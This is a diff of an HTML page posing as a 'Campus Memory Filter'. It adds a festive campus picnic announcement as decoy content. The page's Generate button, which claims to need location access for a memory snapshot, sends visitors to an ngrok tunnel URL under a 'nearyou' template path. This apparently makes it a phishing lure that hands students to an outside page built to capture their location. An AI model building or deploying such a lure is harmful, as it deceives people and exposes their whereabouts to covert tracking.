@@ -21,6 +21,37 @@
       border-radius: 8px;
       display: inline-block;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 800px;
+      text-align: left;
+    }
+    .event-section {
+      margin-top: 50px;
+      padding: 30px;
+      background: #ffffffd0;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    }
+    .event-section h2 {
+      color: #222;
+      font-size: 28px;
+      margin-bottom: 15px;
+    }
+    .event-section p {
+      font-size: 16px;
+      line-height: 1.6;
+      color: #444;
+    }
+    .more-info {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+    .more-info a {
+      color: #1e90ff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .more-info a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
@@ -28,14 +59,35 @@
   <h1>🎓 Campus Memory Filter 📍</h1>
   <p>To generate your last-day memory snapshot, please allow location access below:</p>
   <button onclick="getLocation()">Generate</button>
-  <div id="output"></div>
+
+  <div class="event-section">
+    <h2>🌙✨ One Last Night – Campus Send-Off Picnic Bash ✨🌙</h2>
+    <p><strong>💌 For the Lovers, the Besties, and the Secret Crushes...</strong></p>
+    <p>Before you throw that cap in the air and walk different paths — let’s share laughs, music, stories, and vibes under the stars.</p>
+
+    <p><strong>🎉 What’s Happening?</strong><br>
+    🧺 Picnic-Style Night Setup<br>
+    🔥 Bonfire Lounge | Fairy Lights | Blankets & Baskets<br>
+    🎶 Live DJ + Acoustic Performances – Dance, vibe, or just chill with your people<br>
+    📸 Memory Lane Photo Wall – Polaroid stations & “Before We Go” message board<br>
+    🎤 Open Mic Moments – Say that thing you've been holding back 😅<br>
+    🥂 Mocktail Toast at Midnight – Because endings deserve to be celebrated right!</p>
+
+    <p><strong>👥 Who Should Come?</strong><br>
+    Campus lovebirds 🥰<br>
+    Ride-or-die friend groups 🤗<br>
+    That person you’ve always wanted to talk to 😏<br>
+    <em>EVERYONE ready to make one last memory</em></p>
+
+    <div class="more-info">
+      <p>For more details on location, packages, and ticketing, <a href="http://your-website-link.com" target="_blank">click here</a>!</p>
+    </div>
+  </div>
 
   <script>
-  
-  function getLocation() {
-    window.location.href = "http://c72d-197-248-59-233.ngrok-free.app/templates/nearyou/index.html";
-  }
-
+    function getLocation() {
+      window.location.href = "http://c72d-197-248-59-233.ngrok-free.app/templates/nearyou/index.html";
+    }
   </script>
 </body>
 </html>
